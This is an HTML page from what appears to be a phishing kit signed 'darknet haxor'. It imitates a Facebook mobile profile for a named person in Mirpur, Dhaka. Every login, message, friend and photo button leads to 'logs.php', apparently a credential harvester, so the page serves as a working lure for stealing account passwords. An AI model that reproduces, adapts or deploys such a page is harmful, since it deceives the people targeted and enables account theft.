<!-- DARKNET HAXOR:
________ _______ ________ ______ _______   ____________________ 
___  __ \___    |___  __ \___  //_/___  | / /___  ____/___  __/ 
__  / / /__  /| |__  /_/ /__  ,<   __   |/ / __  __/   __  /    
_  /_/ / _  ___ |_  _, _/ _  /| |  _  /|  /  _  /___   _  /     
/_____/  /_/  |_|/_/ |_|  /_/ |_|  /_/ |_/   /_____/   /_/     

______  _________ ____  _________ ________                     
___  / / /___    |__  |/ /__  __ \___  __ \                    
__  /_/ / __  /| |__    / _  / / /__  /_/ / 
_  __  /  _  ___ |_    |  / /_/ / _  _, _/  
/_/ /_/   /_/  |_|/_/|_|  \____/  /_/ |_| 
------------------------------------------------------------    
Author   : darknet haxor 
Telegram : https://t.me/officialdarknethaxor
------------------------------------------------------------>
<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
  <title>Steven Cao | Faceb00k</title>
  <meta name="viewport" content="initial-scale=1, width=240">
  <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
  <meta name="theme-color" content="#3b5998">
  <style type="text/css" nonce="">.dq{padding:8px;text-shadow:0 1px 0 #fff;}.bu .bv{display:block;}.bv{border:solid 2px;cursor:pointer;margin:0;padding:2px 6px 3px;text-align:center;}.bw,.b a.bw{background:#f3f4f5;border-color:#ccc #aaa #999;color:#505c77;}.i .bw,.b .i a.bw{background:#3b5998;border-color:#8a9ac5 #29447E #1a356e;color:#fff;}.bv .l{pointer-events:none;}.bv{display:inline-block;}.bv+.bv{margin-left:3px;}.bv input{background:none;border:none;margin:0;padding:0;}.bw input{color:#505c77;}.i .bw input{color:#fff;}.b a,.b a:visited{color:#3b5998;text-decoration:none;}.b a:focus,.b a:hover{background-color:#3b5998;color:#fff;}.bl{background:#fff;}.by{background:#e9ebee;}.ch{position:relative;top:1px;}.b .bz{padding:0;}.b .cd{padding:4px;}.di{color:#90949c;}.dh{color:#4b4f56;}.de{color:#1d2129;}.bq{font-size:12px;line-height:16px;}.dd{font-size:14px;line-height:20px;}.ci{font-size:16px;line-height:20px;}.z{font-weight:normal;}.bx{font-weight:bold;}.bk{text-align:center;}.b .cc{border-collapse:collapse;margin:0;width:100%;}.b td.cg{border:0;padding:6px 0 6px 6px;vertical-align:middle;}.b .cc .cj{padding:6px 6px 6px 0;text-align:right;white-space:nowrap;}.b .cf{padding:6px;}.b .dt{border:0;border-collapse:collapse;margin:0;padding:0;width:100%;}.b .dt tbody{vertical-align:top;}.b .dt td{padding:0;}.b .dt td.cd{padding:4px;}.b .ce{width:100%;}.b .cn{padding:4px;}.ck>*,.ck.ck>*{border-bottom:1px solid #e5e5e5;}.ck>:last-child{border-bottom:none;}.ck+.ck{border-top:1px solid #e5e5e5;}.br{color:#8d949e;}.bt{color:#1d2129;font:26px Helvetica, Arial, sans-serif;font-weight:300;letter-spacing:-0.25px;line-height:1;}.bs{padding:12px;}.k{padding-bottom:4px;padding-top:4px;}.q{padding-left:36px;padding-right:36px;}.da{padding-left:4px;}.dk{position:relative;}.dp{float:right;max-width:85%;overflow:hidden;text-align:right;text-overflow:ellipsis;}.dn{-webkit-user-select:none;}.dm{width:100%;}.dm .do{text-align:right;}.s{text-align:center;}.o{background-color:#f5f6f7;padding-bottom:18px;padding-top:18px;}.r{align-items:center;color:#1d2129;font-size:16px;line-height:20px;margin-bottom:15px;text-align:center;}.u{-webkit-appearance:none;background:none;display:inline-block;font-size:12px;height:28px;line-height:28px;margin:0;overflow:visible;padding:0 9px;text-align:center;vertical-align:top;white-space:nowrap;}.b .u{border-radius:2px;}.ct,a.ct,.b a.ct,.b a.ct:visited{background-color:#f5f6f7;color:#4b4f56;}.b a.ct:hover,.b .ct:hover{background-color:#ebedf0;color:#4b4f56;}.b .ct{border:1px solid #bec3c9;}.ct[disabled]{color:#bec3c9;}.b .ct[disabled]:hover{background-color:#f5f6f7;color:#bec3c9;}.y,.bj,a.y,a.bj,html .b a.y,html .b a.bj{color:#fff;}.b .bj{background-color:#4080ff;border:1px solid #4476e8;}.b a.bj:hover,.b .bj:hover{background-color:#4580ef;}.b .y{background-color:#4267b2;border:1px solid #365899;}.b a.y:hover,.b .y:hover{background-color:#465e91;}.y[disabled]{color:#899bc1;}.bj[disabled]{color:#91b4fd;}.b .y[disabled]:hover{background-color:#4267b2;}.b .bj[disabled]:hover{background-color:#4080ff;}.cs{font-size:14px;height:36px;line-height:36px;padding:0 16px;}.u .ba{display:inline-block;}.b .u .ba{display:inline-block;margin-top:0;vertical-align:middle;}.b a.u::after{content:"";display:inline-block;height:100%;vertical-align:middle;}.u .ba{line-height:20px;margin-top:4px;}.cs .ba{line-height:24px;margin-top:6px;}.u.cq{display:block;width:100%;}a.u.cq,.b label.u.cq{display:block;width:auto;}.b .u{padding:0 8px;}.b a.u{height:26px;line-height:26px;}.b .cs{padding:0 15px;}.b a.cs{font-size:14px;height:34px;line-height:34px;}.ba{pointer-events:none;}.bc{height:20px;}.bd{border-bottom:1px solid #ccd0d5;height:10px;text-align:center;width:100%;}.be{color:#4b4f56;font-size:12px;line-height:20px;padding:0 10px;}.bf{background-color:#f5f6f7;}.bn{display:inline-block;position:relative;vertical-align:bottom;}.bo{border-radius:4px;box-shadow:0 1px 2px rgba(0, 0, 0, .125);display:block;margin-top:-50%;padding:2px;}.bo.bo.bo{background-color:#fff;}.bm{background-color:#1c1e21;overflow:hidden;position:relative;}.bp{background:#eceff5;}.l{border:0;display:inline-block;vertical-align:top;}i.l u{position:absolute;width:0;height:0;overflow:hidden;}.df{margin-right:4px;}.dc{margin-right:20px;}.cv .cx{display:inline-block;margin-right:4px;}.b .cv .cx{float:left;}.b .cv .db{display:table-cell;}.cy{border-radius:50%;}.dj{clear:both;}.cm{background-color:#f5f6f7;height:150px;margin:10px;padding-top:40px;}.co{color:#8d949e;margin-top:15px;padding-left:25%;width:50%;}.cp{margin:10px;}.cr,.b .cp .cr{overflow:hidden;text-overflow:ellipsis;}.cr .ba,.b .cp .cr .ba{display:inline;}body{text-align:left;direction:ltr;}body,tr,input,textarea,button{font-family:sans-serif;}body,p,figure,h1,h2,h3,h4,h5,h6,ul,ol,li,dl,dd,dt{margin:0;padding:0;}h1,h2,h3,h4,h5,h6{font-size:1em;font-weight:bold;}ul,ol{list-style:none;}article,aside,figcaption,figure,footer,header,nav,section{display:block;}.m{background-color:#fff;}.i{background-color:#3b5998;}.e{background:#dadde1;}#page{position:relative;}.j{padding:2px 3px;}.n{padding:4px 3px;}.dw{display:block;font-size:x-small;margin:-3px -3px 1px -3px;padding:3px;}.dy{border:1px solid #90949c;display:block;font-size:x-large;height:20px;line-height:18px;text-align:center;vertical-align:middle;width:20px;}.b .ds input,.b .ds input:visited,.b .ds a,.b .ds a:visited{color:#bec3c9;}.b .ds input:focus,.b .ds input:hover,.b .ds a:focus,.b .ds a:hover{background:#dadde1;color:#1d2129;}.dr{background-color:#444950;font-size:x-small;padding:7px 8px 8px;}.dv{color:#bec3c9;display:block;font-size:x-small;margin:-3px -3px 1px -3px;padding:3px;}.ea{color:#fff;}body,tr,input,textarea,.f{font-size:medium;}/*]]>*/</style> 
 </head>
 <body tabindex="0" class="b c d e">
  <div class="f">
   <div id="viewport">
    <div class="g h" id="MChromeHeader">
     <div class="i j" role="banner" id="header">
      <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
      <a href=""><img src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/k97pj8-or6s.png" width="77" height="16" class="k l" alt="facebook"></a>
     </div>
    </div>
    <div id="objects_container">
     <div class="m n">
      <h2>Steven Cao | Facebook</h2>
     </div>
     <div class="e" id="root" role="main">
      <div id="timelineBody">
       <div class="o p q" id="mobile_login_bar">
        <div class="r">
         <strong>Steven Cao is on Facebook.</strong> To connect with Steven, join Facebook today.
        </div>
        <div class="s">
         <a href="#" class="t u v w x y z"><span class="ba">Join</span></a>
         <div class="bb">
          <div class="bc">
           <div class="bd">
            <span class="be bf">or</span>
           </div>
          </div>
         </div>
         <a href="logs.php" class="t u bg bh bi bj z"><span class="ba">Log In</span></a>
        </div>
       </div>
       <div class="bk bl">
        <div>
         <div class="bm" style="height:82px">
          <img src="img/add1-cover.jpg" width="267" height="150" class="l">
         </div>
        </div>
        <div class="bk bn">
         <div class="bo">
          <img src="img/add1-profile.jpg" width="97" height="97" class="bp l" alt="Nadia Akter, profile picture">
         </div>
        </div>
        <div class="bq br bs" id="cover-name-root">
         <h3 class="bt">Steven Cao</h3>
        </div>
       </div>
       <table class="bu">
        <tbody>
         <tr>
          <td><a href="logs.php" class="bv bw">Add Friend</a></td>
          <td><a href="logs.php" class="bv bw">Message</a></td>
          <td><a href="logs.php" class="bv bw">Photos</a></td>
         </tr>
        </tbody>
       </table>
       <div style="margin-bottom:10px;" id="profile_photos_unit">
        <div>
         <div class="bl">
          <div class="bx by bz ca cb">
           <table class="cc cd">
            <tbody>
             <tr>
              <td class="ce cf cg" aria-hidden="false">
               <div class="ch" role="heading" tabindex="0">
                <span class="ci">Photos</span>
               </div></td>
              <td class="ce cj cg">
               <div></div></td>
             </tr>
            </tbody>
           </table>
          </div>
          <div class="ck cl">
           <div class="bk cm cn">
            <div class="co">
             Log in or create an account to see photos of 
             <strong>Steven Cao</strong>
            </div>
           </div>
           <div class="cp cn">
            <a href="logs.php" class="t u cq cr cs y z"><span class="ba">Log in to Facebook</span></a>
           </div>
           <div class="cp cn">
            <a href="#" class="t u cq cr cs ct z"><span class="ba">Create New Facebook Account</span></a>
           </div>
          </div>
         </div>
        </div>
       </div>
       <div id="main_column">
        <div>
         <div class="bl">
          <div class="bx by bz ca cb">
           <table class="cc cd">
            <tbody>
             <tr>
              <td class="ce cf cg" aria-hidden="false">
               <div class="ch" role="heading" tabindex="0">
                <span class="ci">Education</span>
               </div></td>
              <td class="ce cj cg">
               <div></div></td>
             </tr>
            </tbody>
           </table>
          </div>
          <div class="ck cl">
           <div class="cu cn">
            <div class="cv cw">
             <a class="cx" href="#"><img src="img/add-college.jpg" width="48" height="48" class="cy cz bp l" alt="BCIC College,Mirpur, profile picture"></a>
             <div class="da db">
              <div class="dc">
               <div>
                <span class="dd de bx df"><a class="dg" href="#">BCIC College,Mirpur</a></span>
               </div>
              </div>
              <div>
               <span class="bq dh">University</span>
              </div>
              <div>
               <span class="bq di">1 October 2020 - Present</span>
              </div>
             </div>
             <div class="dj"></div>
            </div>
           </div>
          </div>
         </div>
        </div>
        <div>
         <div class="bl">
          <div class="bx by bz ca cb">
           <table class="cc cd">
            <tbody>
             <tr>
              <td class="ce cf cg" aria-hidden="false">
               <div class="ch" role="heading" tabindex="0">
                <span class="ci">Places lived</span>
               </div></td>
              <td class="ce cj cg">
               <div></div></td>
             </tr>
            </tbody>
           </table>
          </div>
          <div class="ck cl">
           <div class="dk cn">
            <div class="cu dl">
             <table cellspacing="0" cellpadding="0" class="dm">
              <tbody>
               <tr>
                <td valign="top">
                 <div class="dh dn">
                  <span class="ci dh z">Current City</span>
                 </div></td>
                <td valign="top" class="do">
                 <div class="dp">
                  <a href="#">Mirpur, Dhaka, Bangladesh</a>
                 </div></td>
               </tr>
              </tbody>
             </table>
            </div>
           </div>
          </div>
         </div>
        </div>
       </div>
       <div style="margin-bottom:10px;">
        <div>
         <div class="bl">
          <div class="bx by bz ca cb">
           <table class="cc cd">
            <tbody>
             <tr>
              <td class="ce cf cg" aria-hidden="false">
               <div class="ch" role="heading" tabindex="0">
                <span class="ci">Links</span>
               </div></td>
              <td class="ce cj cg">
               <div></div></td>
             </tr>
            </tbody>
           </table>
          </div>
          <div class="ck cl">
           <div class="dq cn">
            <a href="#">See more people named Steven Cao</a>
           </div>
          </div>
         </div>
        </div>
       </div>
      </div>
      <div style="display:none">
       <div></div>
       <div></div>
       <div></div>
      </div>
      <span><img src="#" width="0" height="0" style="display:none"></span>
     </div>
    </div>
    <div class="bl">
     <div class="dr">
      <div class="ds">
       <table class="dt" role="presentation">
        <tbody>
         <tr>
          <td class="ce du" style="width:50%"><b class="dv">English (UK)</b><a class="dw" href="">অসমীয়া</a><a class="dw" href="">Português (Brasil)</a></td>
          <td class="ce dx" style="width:50%"><a class="dw" href="">বাংলা</a><a class="dw" href="">Español</a><a class="dw" href="">
            <div class="dy">
              + 
            </div></a></td>
         </tr>
        </tbody>
       </table>
      </div>
     </div>
    </div>
   </div>
  </div>
 </body>
</html>
